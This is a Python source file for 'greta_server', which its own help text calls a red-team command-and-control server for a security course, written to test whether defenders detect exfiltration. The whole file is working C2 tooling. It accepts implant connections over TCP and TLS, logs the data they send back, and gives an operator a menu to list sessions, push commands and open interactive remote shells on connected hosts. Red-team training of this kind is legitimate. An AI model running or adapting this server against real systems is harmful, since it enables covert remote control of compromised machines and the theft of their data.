


#!/usr/bin/python3

import socket
import threading
import time
import ssl
import argparse
import logging

class TCPServer:

    def __init__(self, host, tcp_port, tls_port, certfile=None, keyfile=None):
        self.host = host
        self.tcp_port= tcp_port
        self.tls_port= tls_port
        self.certfile = certfile
        self.keyfile = keyfile
        self.client_sessions = {}

    def logging(self, log, message):

        logger = logging.getLogger(log)
        
        if not logger.handlers:

            f_handler = logging.FileHandler(f"./logs/{log}.log")
            f_handler.setLevel(logging.INFO)

            f_format = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            f_handler.setFormatter(f_format)

            logger.addHandler(f_handler)
       
        logger.setLevel(logging.INFO) 
        logger.info(message)

    def start_server(self):
        threading.Thread(target=self.tcp_server).start()
        if self.certfile and self.keyfile:
            threading.Thread(target=self.tls_server).start()

        threading.Thread(target=self.menu).start()

    def tcp_server(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.tcp_port))
            server_socket.listen(10)
            print(f"TCP server listening on {self.host}:{self.tcp_port}...")
            self.logging("server", f"TCP server listening on {self.host}:{self.tcp_port}")
            self.handle_connections(server_socket)

    def tls_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            with context.wrap_socket(server_socket, server_side=True) as tls_socket:
                tls_socket.bind((self.host, self.tls_port))
                tls_socket.listen(10)
                print(f"TLS Server Listening on {self.host}:{self.tls_port}")
                self.logging("server", f"TLS server listening on {self.host}:{self.tls_port}")
                self.handle_connections(tls_socket)

    def handle_connections(self, server_socket):
        try:
            while True:
                client_socket, addr = server_socket.accept()
                client_id = f"{addr[0]}:{addr[1]}"
                self.client_sessions[client_id] = client_socket
                print(f"New Connection from {client_id}")
                self.logging("server", f"New connection from {client_id}")
                threading.Thread(target=self.handle_client, args=(client_socket, client_id)).start()

        except KeyboardInterrupt:
            print("Server is shutting down.")
            self.logging("server", "Shutting Down Server")
        
        finally:
            server_socket.close()
            self.logging("server", "Server Socket Closed")

    def handle_client(self,client_socket, client_id):
        try:
            while True:
                data = client_socket.recv(2048)
                if not data:
                    break
                print(f"Revieved from {client_id}: {data.decode()}")
                self.logging(client_id, data.decode())

        finally:
            client_socket.close()
            del self.client_sessions[client_id]
            print(f"Connection with {client_id} closed.")
            self.logging("server", f"Connection with {client_id} closed")
            self.logging(client_id, "Connection Closed")            
    
    def interactive_session_shell(self, session_id):
        print(f"Now interacting with {session_id} escape with bAcK")
        
        while True:
        
            command = input(":>")
            if command =='bAcK':
                print("Escape character detected, breaking session!")
                break
            else:
                command = command + '\n'
                self.client_sessions[session_id].send(command.encode())
                self.logging(session_id, command)
                time.sleep(1)
            
    def menu(self):
        while True:
            print("\nAvaliable Commands:")
            print("1. List Active Sessions")
            print("2. Send command to a session")
            print("3. Interactive Session Shell")
            print("4. Terminate Session")
            print("5. Exit")
            choice = input("Enter your choice: ")
            if choice == '1':
                for session in self.client_sessions:
                    print(session)
            elif choice == '2':
                session_id = input("Enter session ID: ")
                if session_id in self.client_sessions:
                    command = input("Enter command to send: ")
                    command = command + "\n"
                    self.client_sessions[session_id].send(command.encode())
                    self.logging(session_id, command)
                else:
                    print("Session not found.")
            
            elif choice == '3':
                session_id = input("Enter session ID: ")
                if session_id in self.client_sessions:
                    self.logging(session_id, "Starting Interactive Session")
                    self.interactive_session_shell(session_id)
                else:
                    print("Session not found")
            
            elif choice == '4':
                session_id = input("Enter session ID: ")
                if session_id in self.client_sessions:
                    self.client_sessions[session_id].close()
                    del self.client_sessions[session_id]
                    self.logging("server", f"Session terminated for {session_id}")
                    self.logging(session_id, "Session Terminated")
            
            elif choice == '5':
                quit()
            time.sleep(1)
            
if __name__ == "__main__":

    print("   / \__")
    print("  (    @\___")
    print("  /         O ")
    print(" /   (_____/")
    print("/_____/ U")
    print('                               ___               ')
    print('                              (   )              ')
    print('  .--.    ___ .-.      .--.    | |_       .---.  ')
    print(' /    \  (   )   \    /    \  (   __)    / .-, \ ')
    print(";  ,-. '  | ' .-. ;  |  .-. ;  | |      (__) ; | ")
    print("| |  | |  |  / (___) |  | | |  | | ___    .'`  | ")
    print("| |  | |  | |        |  |/  |  | |(   )  / .'| | ")
    print("| |  | |  | |        |  ' _.'  | | | |  | /  | | ")
    print("| '  | |  | |        |  .'.-.  | ' | |  ; |  ; | ")
    print("'  `-' |  | |        '  `-' /  ' `-' ;  ' `-'  | ")
    print(" `.__. | (___)        `.__.'    `.__.   `.__.'_. ")
    print(" ( `-' ;                                         ")
    print("  `.__.                                          ")

    parser = argparse.ArgumentParser(prog="greta_server.py version 1.0", description='Red team script to allow multiple forms of C2 for testing the ability of defenders to detect various xfil techniques, written by ac0mm, Andrew Morrow as part of CSC842', epilog="All your logs are belong to us")
    parser.add_argument('-t', '--tcp_port', type=int, help='Set port for TCP socket', required=False, default=50000)
    parser.add_argument('-s', '--tls_port', type=int, help='Set port for TLS socket', required=False, default=50001)
    parser.add_argument('-i', '--host', type=str, help="Set the host for ports to bind to", required=False, default="0.0.0.0")
    parser.add_argument('-c', '--cert', type=str, help="Set the TLS certificate file", required=True)
    parser.add_argument('-k', '--key', type=str, help='Set the Key file for TLS certificate', required=True)
    
    parser_args = parser.parse_args()

    host = parser_args.host
    tcp_port = parser_args.tcp_port
    tls_port = parser_args.tls_port
    certfile = parser_args.cert
    keyfile = parser_args.key

    server = TCPServer(host, tcp_port, tls_port, certfile, keyfile)
    server.start_server()